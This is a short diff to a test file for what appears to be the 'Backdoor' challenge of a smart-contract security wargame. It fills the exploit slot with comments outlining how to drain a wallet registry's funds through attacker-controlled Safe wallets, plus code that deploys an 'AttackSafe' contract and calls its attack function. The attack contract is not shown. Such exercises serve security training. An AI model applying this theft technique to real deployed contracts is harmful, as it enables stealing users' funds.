@@ -37,6 +37,18 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // have contract that creates a safe with the correct benificiary as the first owner, and then us as the second
+        // register the safe with the registry, receive funds
+        // pull funds out to us
+        // deploy my contract
+        // call attack
+        const attackSafe = await (await ethers.getContractFactory('AttackSafe', attacker)).deploy(
+           this.walletRegistry.address,
+           this.masterCopy.address,
+           this.walletFactory.address,
+           this.token.address 
+        );
+        await attackSafe.connect(attacker).attack(users);
     });
 
     after(async function () {
